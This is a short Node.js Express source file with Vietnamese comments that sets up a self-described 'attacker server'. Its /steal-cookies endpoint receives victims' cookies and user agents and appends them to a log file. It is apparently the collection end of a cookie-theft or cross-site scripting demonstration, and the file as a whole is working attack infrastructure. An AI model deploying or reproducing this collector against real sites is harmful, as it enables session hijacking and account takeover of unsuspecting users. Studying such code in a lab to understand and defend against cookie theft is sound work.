const express = require('express');
const fs = require('fs');
const app = express();
const port = 5002; // Port khác với server chính

app.use(express.json());

// Endpoint để nhận và lưu cookies
app.post('/steal-cookies', (req, res) => {
  const { cookies, userAgent } = req.body;
  const timestamp = new Date().toISOString();

  // Tạo log entry
  const logEntry = `[${timestamp}] Cookies: ${cookies}\nUser Agent: ${userAgent}\n\n`;

  // Ghi vào file
  fs.appendFile('stolen-cookies.log', logEntry, err => {
    if (err) {
      console.error('Error writing to file:', err);
      return res.status(500).send('Error saving cookies');
    }
    res.send('Cookies received');
  });
});

app.listen(port, () => {
  console.log(`Attacker server running at http://localhost:${port}`);
});
